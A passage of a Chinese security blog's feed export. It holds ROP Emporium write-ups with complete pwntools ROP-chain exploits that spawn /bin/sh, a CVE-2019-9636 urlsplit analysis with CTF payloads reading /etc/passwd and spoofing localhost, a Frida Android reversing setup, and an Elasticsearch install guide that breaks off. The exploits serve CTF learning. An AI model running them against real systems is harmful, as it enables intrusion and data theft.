class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_edi_esi_ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># write "/sh" to data</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_esi_edi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_edi_esi_ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># decode xor</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>bin_sh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>pop_ebx_ecx_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>data_addr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>xor_num<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>xor_ebx_ecx_ret<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># system(/bin/sh)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>data_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/badchars/1.jpg" alt></p><h5 id="64位-4"><a href="#64位-4" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/badchars.zip" target="_blank" rel="noopener">64位</a>:</h5><p>和32位一样思路, 只是找到<code>gadget</code>不一样, 还要注意要比32位程序多用一个<code>pop rdi; ret</code>.</p><p>exp:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./badchars"</span><span class="token punctuation">)</span>xor_num <span class="token operator">=</span> <span class="token number">2</span>binsh <span class="token operator">=</span> <span class="token string">'/bin/sh\x00'</span>xorbinsh <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> binsh<span class="token punctuation">:</span>    a <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> xor_num    xorbinsh <span class="token operator">+=</span> chr<span class="token punctuation">(</span>a<span class="token punctuation">)</span>overflow <span class="token operator">=</span> cyclic_find<span class="token punctuation">(</span><span class="token string">"kaaa"</span><span class="token punctuation">)</span>pop_rdi_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b39</span>pop_r12_r13_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b3b</span>mov_r13_r12_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b34</span>pop_r14_r15_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b40</span>xor_r15_r14_ret <span class="token operator">=</span> <span class="token number">0x0000000000400b30</span>bss_addr <span class="token operator">=</span> <span class="token number">0x601080</span>system_addr <span class="token operator">=</span> <span class="token number">0x4006f0</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> overflowpayload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12_r13_ret<span class="token punctuation">)</span> <span class="token operator">+</span> xorbinsh <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_r13_r12_ret<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span>len<span class="token punctuation">(</span>xorbinsh<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r14_r15_ret<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_num<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> i<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r15_r14_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/badchars/2.jpg" alt></p><h2 id="fluff"><a href="#fluff" class="headerlink" title="fluff"></a>fluff</h2><h5 id="32位-5"><a href="#32位-5" class="headerlink" title="32位:"></a><a href="https://ropemporium.com/binary/fluff32.zip" target="_blank" rel="noopener">32位</a>:</h5><p>看介绍, 就是<code>write4</code>的升级版, 肯定是要找一条可以把寄存器的值写入到内存地址上的指令, </p><pre><code>0x08048693 : mov dword ptr [ecx], edx ; pop ebp ; pop ebx ; xor byte ptr [ecx], bl ; ret</code></pre><p>但是没找到<code>pop ecx; pop edx; ret</code>之类的操作</p><p>可是…可以发现一条</p><pre><code>0x080485f3 : popal ; cld ; ret</code></pre><p>第一次遇到这个指令, 去搜了一下, 可以从栈上弹到所有寄存器,<br>顺序是<code>%edi-&gt;%esi-&gt;%ebp-&gt;%esp-&gt;%ebx-&gt;%edx-&gt;%ecx-&gt;%eax</code><br>也就是相当于</p><pre><code>pop edi;pop esi;pop ebp;pop esp;pop ebx;pop edx;pop ecx;pop eax;</code></pre><p>这样我们只需要随便填充其他的寄存器, 然后把<code>ecx, edx</code>寄存器填写成我们需要的内容就可以了.</p><p>为了减少代码量, 我们还可以写个函数.</p><p>直接上exp</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fluff32"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>offset <span class="token operator">=</span> <span class="token number">44</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0804a040</span>bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span>system_addr <span class="token operator">=</span> <span class="token number">0x0804865A</span>popal <span class="token operator">=</span> <span class="token number">0x080485f3</span> <span class="token comment" spellcheck="true"># %edi->%esi->%ebp->%esp->%ebx->%edx->%ecx->%eax</span>mov_ecx_edx <span class="token operator">=</span> <span class="token number">0x08048693</span> <span class="token comment" spellcheck="true"># 2  mov [ecx], edx</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>text<span class="token punctuation">,</span> offset<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload <span class="token operator">=</span> p32<span class="token punctuation">(</span>popal<span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> text  <span class="token comment" spellcheck="true"># edx</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>bss_addr <span class="token operator">+</span> offset<span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># ecx</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>mov_ecx_edx<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> payloadpayload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offsetpayload <span class="token operator">+=</span> write<span class="token punctuation">(</span>bin_sh<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> write<span class="token punctuation">(</span>bin_sh<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/fluff/1.jpg" alt></p><h5 id="64位-5"><a href="#64位-5" class="headerlink" title="64位:"></a><a href="https://ropemporium.com/binary/fluff.zip" target="_blank" rel="noopener">64位</a>:</h5><p>只要搞明白, 0 与 正数进行异或, 得到的结果就是那个正数, 可以通过这个方法间接给一个寄存器赋值.</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./fluff"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># var</span>offset <span class="token operator">=</span> <span class="token number">0x28</span>system_addr <span class="token operator">=</span> <span class="token number">0x4005E0</span>bss_addr <span class="token operator">=</span> <span class="token number">0x0000000000601060</span>pop_rdi <span class="token operator">=</span> <span class="token number">0x00000000004008c3</span>  <span class="token comment" spellcheck="true"># pop rdi; ret</span>xor_r11_r11 <span class="token operator">=</span> <span class="token number">0x0000000000400822</span>  <span class="token comment" spellcheck="true"># xor r11, r11; pop; ? ret</span>pop_r12 <span class="token operator">=</span> <span class="token number">0x0000000000400832</span> <span class="token comment" spellcheck="true"># pop r12 ; ?; ret</span>xor_r11_r12 <span class="token operator">=</span> <span class="token number">0x000000000040082F</span> <span class="token comment" spellcheck="true"># xor r11, r12; pop; ?; ret</span>mov_r10_r11 <span class="token operator">=</span> <span class="token number">0x000000000040084E</span>   <span class="token comment" spellcheck="true"># mov [r10], r11; pop r13; pop r12; xor [r10], r12b; ret</span>xchg_r10_r11 <span class="token operator">=</span> <span class="token number">0x0000000000400840</span>  <span class="token comment" spellcheck="true"># xchg; pop; ?; ret</span>bin_sh <span class="token operator">=</span> <span class="token string">"/bin/sh"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">"\0"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># A == 0   ->   A ^= ?   ->  A = ?</span><span class="token triple-quoted-string string">""">>> r11 = 100>>> r11 ^= r11>>> r110>>> r12 = 200>>> r11 ^= r12>>> r11200"""</span>payload <span class="token operator">=</span> <span class="token string">"A"</span> <span class="token operator">*</span> offset<span class="token comment" spellcheck="true"># bin/sh  ->  bss</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># r12 = bss_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = r12 = bss_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xchg_r10_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># r10 = 0   ->   r10 = r11 = r12 = bss_addr</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_r12<span class="token punctuation">)</span> <span class="token operator">+</span> bin_sh           <span class="token comment" spellcheck="true"># r12 = /bin/sh </span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>xor_r11_r12<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true"># r11 = 0   ->   r11 = r12 = /bin/sh</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>mov_r10_r11<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># mov [bss], /bin/sh</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>pop_rdi<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_addr<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># bss_addr = /bin/sh</span>payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>                <span class="token comment" spellcheck="true"># system(bss_addr) = system(/bin/sh)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="/images/14/fluff/2.jpg" alt></p><h2 id="pivot"><a href="#pivot" class="headerlink" title="pivot"></a>pivot</h2><p>待补充…</p><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><p>待补充…</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下学习ROP的基础题目.&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
      <category term="PWN" scheme="https://helianthus.top/tags/PWN/"/>
    
      <category term="ROP" scheme="https://helianthus.top/tags/ROP/"/>
    
  </entry>
  
  <entry>
    <title>Python 3.7.2 urllib.parse.urlsplit 漏洞分析</title>
    <link href="https://helianthus.top/2020/05/27/13-Python-3-7-2-urlsplit-cve/"/>
    <id>https://helianthus.top/2020/05/27/13-Python-3-7-2-urlsplit-cve/</id>
    <published>2020-05-27T13:29:33.000Z</published>
    <updated>2020-05-27T06:32:17.395Z</updated>
    
    <content type="html"><![CDATA[<p>Python 3.7.2的<code>urllib.parse</code>模块下<code>urlsplit</code>错误的处理字符导致漏洞。</p><a id="more"></a><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>用 Punycode/IDNA 编码的 URL 使用 NFKC 规范化来分解字符。可能导致某些字符将新的段引入 URL。</p><p>例如，在直接比较中, <code>\uFF03</code>不等于<code>＃</code>，而是统一化为<code>＃</code>，这会更改 URL 的片段部分。</p><p>类似地，<code>\u2100</code> 统一化为<code>a/c</code>，它引入了路径段。</p><p><code>℅</code>解析为<code>c/o</code><br><code>℆</code>解析为<code>c/u</code></p><p><img src="/images/13/1.png" alt></p><h1 id="CTF例子"><a href="#CTF例子" class="headerlink" title="CTF例子"></a>CTF例子</h1><h4 id="SUCTF-2019-Pythonginx"><a href="#SUCTF-2019-Pythonginx" class="headerlink" title="[SUCTF 2019]Pythonginx"></a>[SUCTF 2019]Pythonginx</h4><p>题目链接: <a href="https://buuoj.cn/challenges#[SUCTF%202019]Pythonginx" target="_blank" rel="noopener">Pythonginx</a><br>这个题目通过构造<code>℆</code> 使其构造为<code>?url=file://suctf.c℅pt/../etc/passwd</code>, 以此解析成<code>suctf.cc/opt/../etc/passwd</code>, 就可以看到<code>/etc/passwd</code>的内容.<br><img src="/images/13/2.png" alt></p><h4 id="SharkyCTF-Aqua-World"><a href="#SharkyCTF-Aqua-World" class="headerlink" title="[SharkyCTF]Aqua World"></a>[SharkyCTF]Aqua World</h4><p>题目链接: <a href="https://ctfd.sharkyctf.xyz/challenges#Aqua%20World" target="_blank" rel="noopener">Aqua World</a><br>这个题目需要以<code>本地</code>的地址访问到这个网站, 题目也提示了要使urlsplit后的<code>netloc</code>为<code>本地地址</code>, 然后通过F12查看服务器的Python版本是<code>3.7.2</code><br><img src="/images/13/3.png" alt></p><p>这个网站存在一个anonymous的登录, 尝试分割这个url, 参考<code>CVE-2019-9636</code>, 可以得到<br><img src="/images/13/4.png" alt></p><p>继续参考, 可以看到一个例子:</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> u <span class="token operator">=</span> <span class="token string">"https://example.com\uFF03@bing.com"</span><span class="token operator">>></span><span class="token operator">></span> urlsplit<span class="token punctuation">(</span>u<span class="token punctuation">)</span><span class="token punctuation">.</span>netloc<span class="token punctuation">.</span>rpartition<span class="token punctuation">(</span><span class="token string">"@"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span>bing<span class="token punctuation">.</span>com</code></pre><p>于是我们尝试<br><code>http://anonymous:anonymous@aquaworld.sharkyctf.xyz/admin-query?flag=flag</code>根据上面的例子进行更改, 为  <code>http://anonymous:anonymous@aquaworld.sharkyctf.xyz/admin-query\uFF03@localhost?flag=flag</code></p><p>发送payload!</p><p><img src="/images/13/5.png" alt></p><p>可以看到<code>netloc</code>已经被更改了, 但是没有得到flag, 于是更改payload的<code>localhost</code>为<code>127.0.0.1</code>, 再次进行尝试.</p><p><img src="/images/13/6.png" alt></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>官方解决办法是, 遇到这几个特殊字符直接抛出<code>Value Error</code><br><img src="/images/13/7.png" alt></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://bugs.python.org/issue36216" target="_blank" rel="noopener">CVE-2019-9636：urlsplit 不处理 NFKC 标准化</a></p><p><a href="https://bugs.python.org/issue36742" target="_blank" rel="noopener">CVE-2019-10160：urlsplit NFKD 标准化漏洞</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Python 3.7.2的&lt;code&gt;urllib.parse&lt;/code&gt;模块下&lt;code&gt;urlsplit&lt;/code&gt;错误的处理字符导致漏洞。&lt;/p&gt;
    
    </summary>
    
    
      <category term="网络安全" scheme="https://helianthus.top/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="Python" scheme="https://helianthus.top/tags/Python/"/>
    
      <category term="CVE" scheme="https://helianthus.top/tags/CVE/"/>
    
      <category term="URLSPLIT" scheme="https://helianthus.top/tags/URLSPLIT/"/>
    
  </entry>
  
  <entry>
    <title>2020网鼎杯 安卓逆向 bang</title>
    <link href="https://helianthus.top/2020/05/11/12-wangdingCUP-bang-reverse/"/>
    <id>https://helianthus.top/2020/05/11/12-wangdingCUP-bang-reverse/</id>
    <published>2020-05-11T14:04:38.000Z</published>
    <updated>2020-05-27T06:35:56.936Z</updated>
    
    <content type="html"><![CDATA[<p>参加了一下网鼎杯, 太难了…QAQ, 赛后根据大佬的思路重新做了一遍题目, 记录一下…</p><a id="more"></a><h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h2><ul><li>Python3</li><li>Jadx-GUI</li><li>Frida  (<code>python -m pip install frida-tools</code>)</li><li><a href="https://github.com/frida/frida/releases" target="_blank" rel="noopener">Frida-server</a></li><li><a href="https://github.com/hluwa/FRIDA-DEXDump" target="_blank" rel="noopener">Frida-DEXDump</a></li><li><a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip" target="_blank" rel="noopener">ADB</a></li><li>安卓模拟器(推荐夜神安卓模拟器)</li></ul><h2 id="Go"><a href="#Go" class="headerlink" title="Go?"></a>Go?</h2><h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h4><p>将题目先安装进模拟器, 然后运行起来.</p><h4 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h4><p>将<code>adb</code>连接到模拟器, <code>adb connect 127.0.0.1:62001</code>, 看到success就代表连接成功了.</p><h4 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h4><p>将适合自己模拟器系统的<code>frida-server</code>放入模拟器里.<br>把下载的<code>frida-server</code>也就是<code>frida-server-12.8.20-android-x86.xz</code>,<br>解压成为<code>frida-server-12.8.20-android-x86</code><br>(因为我的夜神模拟器里是x86架构的.) 可以如下命令查看手机版本</p><pre><code>adb shell getprop ro.product.cpu.abi</code></pre><p>将解压后的文件push到手机里面、加执行权限、并运行。</p><pre class=" language-shell"><code class="language-shell">adb push frida-server-12.8.20-android-x86 /data/local/tmp/frida-serveradb shellcd /data/local/tmpchmod 775 frida-server./frida-server</code></pre><p>之后再开一个cmd窗口, 将端口转发到本机</p><pre><code>adb forward tcp:27042 tcp:27042adb forward tcp:27043 tcp:27043</code></pre><h4 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h4><p>检查是否成功</p><pre><code>frida-ps -U</code></pre><p><img src="/images/12/frida-ps.jpg" alt></p><p>如果你和我一样, 那么恭喜.</p><h4 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h4><p>这时找到<code>Frida-DEXDump</code>, 运行<code>python main.py</code><br><img src="/images/12/dumped-dex.jpg" alt><br>就dump出了想要的内容. </p><p>再使用<code>JADX-GUI</code>, 打开得到的.dex文件, 就可以看到.<br><img src="/images/12/jadx.jpg" alt></p><hr><blockquote><p>还是太菜了…</p></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;参加了一下网鼎杯, 太难了…QAQ, 赛后根据大佬的思路重新做了一遍题目, 记录一下…&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://helianthus.top/categories/CTF/"/>
    
    
      <category term="Android" scheme="https://helianthus.top/tags/Android/"/>
    
      <category term="Reverse" scheme="https://helianthus.top/tags/Reverse/"/>
    
      <category term="CTF" scheme="https://helianthus.top/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>Golang 垃圾回收剖析</title>
    <link href="https://helianthus.top/2020/03/10/11-Golang-Gc/"/>
    <id>https://helianthus.top/2020/03/10/11-Golang-Gc/</id>
    <published>2020-03-09T22:05:37.000Z</published>
    <updated>2020-05-27T23:37:03.969Z</updated>
    
    <content type="html"><![CDATA[<p>这一小节介绍三种经典的 GC 算法：引用计数（reference counting）、标记-清扫（mark &amp; sweep）、节点复制（Copying Garbage Collection），分代收集（Generational Garbage Collection）。</p><a id="more"></a><p>直接看大佬的文章, 讲的超级超级详细！！！<br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a><br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a><br><a href="http://legendtkl.com/2017/04/28/golang-gc/" target="_blank" rel="noopener">Golang 垃圾回收剖析</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这一小节介绍三种经典的 GC 算法：引用计数（reference counting）、标记-清扫（mark &amp;amp; sweep）、节点复制（Copying Garbage Collection），分代收集（Generational Garbage Collection）。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Golang" scheme="https://helianthus.top/categories/Golang/"/>
    
    
      <category term="Golang" scheme="https://helianthus.top/tags/Golang/"/>
    
      <category term="Gc" scheme="https://helianthus.top/tags/Gc/"/>
    
  </entry>
  
  <entry>
    <title>ElasticSearch Centos7安装教程</title>
    <link href="https://helianthus.top/2020/02/14/10-ElasticSearch-Quick-Start/"/>
    <id>https://helianthus.top/2020/02/14/10-ElasticSearch-Quick-Start/</id>
    <published>2020-02-13T16:27:13.000Z</published>
    <updated>2020-05-27T06:37:38.838Z</updated>
    
    <content type="html"><![CDATA[<p><strong>ElasticSearch</strong>是一个采用Java语言编写搜索服务器，提供了一个分布式多用户的全文搜索引擎，能够达到实时搜索，稳定，可靠，快速，安装使用方便。</p><a id="more"></a><h1 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h1><h4 id="Centos7"><a href="#Centos7" class="headerlink" title="Centos7"></a>Centos7</h4><p>必须能连接互联网</p><pre class=" language-shell"><code class="language-shell">[root@localhost ~]# cat /etc/redhat-releaseCentOS Linux release 7.7.1908 (Core)</code></pre><h4 id="Xshell"><a href="#Xshell" class="headerlink" title="Xshell"></a>Xshell</h4><p>用来连接Centos主机. 没有的话直接用系统自带的SSH也可以。</p><h1 id="安装ElasticSearch"><a href="#安装ElasticSearch" class="headerlink" title="安装ElasticSearch"></a>安装ElasticSearch</h1><h3 id="前置任务-雾"><a href="#前置任务-雾" class="headerlink" title="前置任务 (雾)"></a>前置任务 (雾)</h3><p>由于<code>es</code>不支持以<code>root</code>用户运行，所以需要创建一个普通用户</p><pre class=" language-shell"><code class="language-shell">[root@localhost ~]# useradd elasticuser</code></pre><p>在自己喜欢的目录创建一个<code>es</code>的下载文件夹. 我选择<code>/usr/es</code></p><pre class=" language-shell"><code class="language-shell">[root@localhost ~]# mkdir -p /usr/es</code></pre><p>因为是用<code>root</code>用户创建的文件夹, <code>elasticuser</code>用户没有权限，所以要更改文件夹的权限</p><pre class=" language-shell"><code class="language-shell">[root@localhost usr]# chown elasticuser:elasticuser es/ -R</code></pre><p>切换成<code>elasticuser</code>用户进行下面的操作</p><pre class=" language-shell"><code class="language-shell">[root@localhost usr]# su elasticuser[elasticuser@localhost usr]$ whoamielasticuser</code></pre><h3 id="准备任务-大雾"><a href="#准备任务-大雾" class="headerlink" title="准备任务 (大雾)"></a>准备任务 (大雾)</h3><p>下载<code>es</code></p><pre class=" language-shell"><code class="language-shell">[elasticuser@localhost usr]$ cd es[elasticuser@localhost es]$ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.6.0-linux-x86_64.tar.gz</code></pre><p>解压</p><pre class=" language-shell"><code class="language-shell">[elasticuser@localhost es]$ lselasticsearch-7.6.0-linux-x86_64.tar.gz[elasticuser@localhost es]$ tar zxvf elasticsearch-7.6.0-linux-x86_64.tar.gz</code></pre><p>修改配置文件</p><ul><li><code>config/jvm.options</code>  (非必须, 目的是调整内存占用少一些)</li></ul><pre class=" language-yml"><code class="language-yml">-Xms512m-Xmx512m</code></pre><ul><li><code>config/elasticsearch.yml</code> (重要, 调整不好会导致ElasticSearch启动失败)</li></ul><p>不要直接复制粘贴, yml格式不允许写注释.</p><pre class=" language-yml"><code class="language-yml">network.host: 0.0.0.0                        // 修改完毕后可以外网访问cluster.name: "centos-cluster"               // 不改就启动起来提示Warningnode.name: "node-1"                          // 不改就启动起来提示Warningdiscovery.seed_hosts: ["127.0.0.1", "[::1]"] // 不改就启动起来提示Warningcluster.initial_master_nodes: ["node-1"]     // 不改就启动起来提示Warning</code></pre><p>尝试启动<code>ElasticSearch</code>.</p><pre class=" language-shell"><code class="language-shell">[elasticuser@localhost elasticsearch-7.6.0]$  ./bin/elasticsearch</code></pre><p>不失众望的报错了, 查看一下报错:<br><img src="/images/10/errors.png" alt></p><h3 id="解决错误-1"><a href="#解决错误-1" class="headerlink" title="解决错误 ([1])"></a>解决错误 ([1])</h3><p>遇到错误不慌， 一个个解决，首先是第一个</p><pre class=" language-shell"><code class="language-shell">[1]: max file descriptors [4096] for elasticsearch process is too low, increase to at least [65535]</code></pre><p>更改<code>/etc/security/limits.conf</code>, 这个时候要使用<code>root</code>用户更改, 写入以下内容</p><pre><code>* soft nofile 65535* hard nofile 65535</code></pre><p>写完是这样的<br><img src="/images/10/limit_conf.png" alt></p><p>接着重启一下服务器. 继续解决下一个bug.</p><h3 id="解决错误-2"><a href="#解决错误-2" class="headerlink" title="解决错误 ([2])"></a>解决错误 ([2])</h3><p>重启完， 先看看第一个错误解决了没有</p><pre class=" language-shell"><code class="language-shell">[root@localhost ~]# ulimit -Hn65535[root@localhost ~]# ulimit 